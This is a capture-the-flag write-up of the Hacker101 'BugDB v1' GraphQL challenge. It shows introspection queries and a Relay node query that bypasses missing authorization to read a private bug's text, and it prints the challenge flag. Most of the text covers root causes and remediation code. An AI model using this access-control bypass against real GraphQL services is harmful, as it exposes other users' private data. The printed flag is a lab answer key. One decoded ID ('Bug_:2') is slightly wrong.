# BugDB v1 - Hacker101 CTF

Platform: Hacker101 CTF
Difficulty: Easy
Category: Web, GraphQL
Flags: 1/1
Date: (upisi datum)

---

## Overview

BugDB is a small bug-tracking application built on GraphQL. Users can report bugs, and some bugs are marked as private, meaning they should only be visible to the reporter. The goal was to retrieve a single flag hidden inside one of the private bug reports.

The hint said: "What can you see? What can you not see?" That phrasing pointed directly at GraphQL introspection, the mechanism that reveals the schema of a GraphQL API. The challenge turned out to be a classic case of GraphQL information disclosure: the schema exposed more than the UI showed, and the API did not enforce authorization on hidden fields.

---

## Reconnaissance

When the challenge started, I was given a GraphiQL interface with a Documentation Explorer panel on the right side. The first thing I did was browse the schema to understand what queries were available.

The root query type exposed the following fields:

- `node(id: ID!)` - Relay-style global node lookup
- `user(before, after, first, last)` - list of users
- `bug(before, after, first, last)` - list of bugs
- `findUser(username)` - find a user by username
- `findBug(_: String)` - find a bug by some argument
- `allUsers(before, after, first, last)` - list of all users
- `allBugs(before, after, first, last)` - list of all bugs

Two things immediately stood out:

1. `findBug` took an argument called `_` (underscore), which is unusual. It suggested the real argument name was intentionally hidden or obfuscated.
2. The `allBugs` query returned a `BugsConnection` type, which is a Relay connection with `edges { node { ... } }` structure.

At this point I still did not know which fields existed on a `Bug`, so the next step was introspection.

---

## Schema enumeration

I ran the standard introspection query against the `Bugs` type:

```graphql
{
  __type(name: "Bugs") {
    name
    fields {
      name
      type {
        name
      }
    }
  }
}
```

The response showed four fields on `Bugs`:

- `id` - global ID
- `reporterId` - integer
- `private` - boolean
- `reporter` - a `Users` object

Notice what was missing: there was no `text` field. So the `Bugs` type used by `allBugs` did not expose the actual content of a bug report. That was the first half of the answer to the hint. You can see the metadata of a bug, but not its content.

Then I checked the type returned by `findBug`, which was called `Bugs_` (with an underscore):

```graphql
{
  __type(name: "Bugs_") {
    name
    fields {
      name
      type {
        name
      }
    }
  }
}
```

This type had five fields:

- `id`
- `reporterId`
- `text` - string
- `private` - boolean
- `reporter`

There it was: `Bugs_` had a `text` field, `Bugs` did not. The application was deliberately splitting the schema into two types. The public listing used one type that hid the content, and an internal type held the actual report text. If I could reach an object through `Bugs_`, I could read the text.

---

## Enumerating bugs

The next step was to list every bug through `allBugs` and see whether private bugs were included:

```graphql
{
  allBugs(first: 100) {
    edges {
      node {
        id
        reporterId
        private
        reporter {
          username
        }
      }
    }
  }
}
```

The response returned two bugs:

```json
{
  "data": {
    "allBugs": {
      "edges": [
        {
          "node": {
            "id": "QnVnczox",
            "reporterId": 1,
            "private": false,
            "reporter": { "username": "admin" }
          }
        },
        {
          "node": {
            "id": "QnVnczoy",
            "reporterId": 2,
            "private": true,
            "reporter": { "username": "victim" }
          }
        }
      ]
    }
  }
}
```

The IDs were base64-encoded strings. Decoding `QnVnczox` gave `Bugs:1`, and decoding `QnVnczoy` gave `Bugs:2`. So the second bug, marked `private: true`, belonged to the user `victim`. That was clearly the bug I was not supposed to be able to see.

The fact that `allBugs` returned private bugs at all was already a problem. But the `Bugs` type did not include `text`, so listing alone was not enough. I needed to access the bug through the type that had `text`, which was `Bugs_`.

---

## Exploitation

I first tried `findBug` directly, but the argument name `_` was not obvious and my initial attempts returned `null`:

```graphql
{
  findBug(id: "QnVnczoy") {
    id
  }
}
```

The server responded with:

```
Unknown argument "id" on field "findBug" of type "Query".
```

So `findBug` did not accept `id`. It accepted `_`. But before spending time on that, I tried the `node` query, which is the standard Relay way of fetching any object by its global ID.

```graphql
{
  node(id: "QnVnczoy") {
    id
    ... on Bugs_ {
      id
      text
      private
      reporterId
    }
  }
}
```

The response returned the private bug, including the `text` field:

```json
{
  "data": {
    "node": {
      "id": "QnVnc186Mg==",
      "text": "^FLAG^8c287c1d0a80a16c732cc9ac21842b36819cb3e8d533f7949c5ca576800d73e0$FLAG$",
      "private": true,
      "reporterId": 2
    }
  }
}
```

That was the flag. Note that the ID in the response (`QnVnc186Mg==`, which decodes to `Bug_:2`) is not the same as the ID I sent (`QnVnczoy`, `Bugs:2`). The `node` interface mapped the ID from the `Bugs` namespace to the `Bugs_` namespace automatically. That is why the same bug could be reached through either type, and why the fragment `... on Bugs_` was necessary to unlock the `text` field.

The `findBug` query, by the way, would also have worked with the correct argument (`_` instead of `id`), but the `node` approach was simpler and avoided the obfuscated argument name entirely.

---

## Why it worked

This challenge demonstrated three separate problems in the GraphQL API, each of which would be worth reporting on a real program.

### 1. Introspection enabled in production

GraphQL introspection lets any client discover the full schema, including types and fields that the UI never exposes. In development this is useful. In production it is often unnecessary, and it makes the attacker's job much easier. The entire path to the flag started with a single introspection query.

### 2. Private data returned by a list query

The `allBugs` query returned every bug in the system, including ones marked `private: true` and owned by another user. There was no filtering by ownership or by the `private` flag. So even without reading the text, I could already see that a private bug existed, who reported it, and its global ID. That is an information leak on its own.

### 3. Authorization missing on the node interface

The `node` query allowed me to fetch any object by its global ID, regardless of whether I was allowed to see it. There was no ownership check, no role check, and no filter on the `private` flag. This is the GraphQL equivalent of an IDOR: the client sends an ID, and the server returns the object without asking whether the caller is entitled to it.

The two-type split (`Bugs` without `text`, `Bugs_` with `text`) was likely intended as a security boundary, but it was not enforced anywhere. The `node` interface happily returned the `Bugs_` representation of the bug, which included the text. So the boundary existed only on paper.

---

## How to prevent it

### Disable introspection in production

Most GraphQL servers allow introspection to be turned off in production. For example, in Apollo Server:

```javascript
const server = new ApolloServer({
  typeDefs,
  resolvers,
  introspection: process.env.NODE_ENV !== 'production',
});
```

This is not a substitute for authorization, but it raises the cost of reconnaissance and removes an easy map of the API.

### Enforce authorization on every field and every resolver

Every resolver that returns data belonging to a user must check that the current session is allowed to see it. For a bug:

```javascript
const resolver = (parent, args, context) => {
  const bug = db.getBug(args.id);
  if (!bug) return null;
  if (bug.private && bug.reporterId !== context.user.id) {
    return null; // or throw new ForbiddenError()
  }
  return bug;
};
```

This check must run for `allBugs`, `bug`, `findBug`, and `node`. It is not enough to hide the field in one resolver; every path to the object must be guarded.

### Do not rely on schema tricks as security

Splitting `Bugs` and `Bugs_` into two types with different fields looks like a defense, but it only works if the type with sensitive fields is unreachable. In practice, `node` and any other resolver that returns the internal type will reach it. Schema design is not a security boundary; authorization logic is.

### Filter list queries by ownership

`allBugs` should return only the bugs the current user is allowed to see:

```javascript
const resolver = (parent, args, context) => {
  return db.getBugs({
    where: {
      OR: [
        { private: false },
        { reporterId: context.user.id },
      ],
    },
    ...args,
  });
};
```

The same applies to `allUsers`, `allPosts`, and any other list query.

### Log and monitor unusual access patterns

Even with authorization in place, it is worth logging access to private objects. A sudden spike in `node` queries for IDs the user does not own is a strong signal of an attack in progress.

---

## Root cause analysis

All three issues come down to the same principle: the server trusted the client to ask only for what it was allowed to see.

The client sent `allBugs` and got everything. The client sent `node(id: "QnVnczoy")` and got the private text. The client sent an introspection query and got the full schema. In every case, the server could have refused, but it did not.

GraphQL makes this class of bug easy to introduce because the schema is designed to be discoverable and because every field is independently resolvable. Developers often focus on the UI, where private bugs are hidden, and forget that the API behind the UI is not obliged to follow the same rules. The API must enforce its own rules, per field, per resolver, on every request.

---

## What I took away from this challenge

1. Introspection is reconnaissance. When I see a GraphQL endpoint, my first move is to dump the schema. Whatever the schema shows is fair game unless the server refuses.

2. The UI is not the API. A field that is hidden in the frontend is still reachable if the backend exposes it. The correct place to hide data is the resolver, not the template.

3. `node` is a powerful primitive. Relay's global node interface lets a client fetch any object by ID. If the resolver does not check ownership, `node` becomes an IDOR on every type in the schema at once.

4. Type-level separation is not access control. Having `Bugs` without `text` and `Bugs_` with `text` does nothing if `Bugs_` is reachable through `node`. Security boundaries must be enforced at runtime, not drawn in the type system.

5. List queries leak by default. Returning every row and trusting the client to filter is a common mistake. The server should return only what the caller is allowed to see.

6. Read the argument names carefully. `findBug(_: String)` was a deliberate attempt to make the query harder to use. Attackers notice these details; so should defenders. If an argument is called `_`, that is a design smell.

---

## References

- OWASP GraphQL Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html
- OWASP Top 10 - A01:2021 Broken Access Control: https://owasp.org/Top10/A01_2021-Broken_Access_Control/
- GraphQL introspection specification: https://graphql.org/learn/introspection/
- Relay Global Object Identification: https://relay.dev/graphql/objectidentification.htm
- CWE-639: Authorization Bypass Through User-Controlled Key: https://cwe.mitre.org/data/definitions/639.html
- CWE-200: Exposure of Sensitive Information to an Unauthorized Actor: https://cwe.mitre.org/data/definitions/200.html
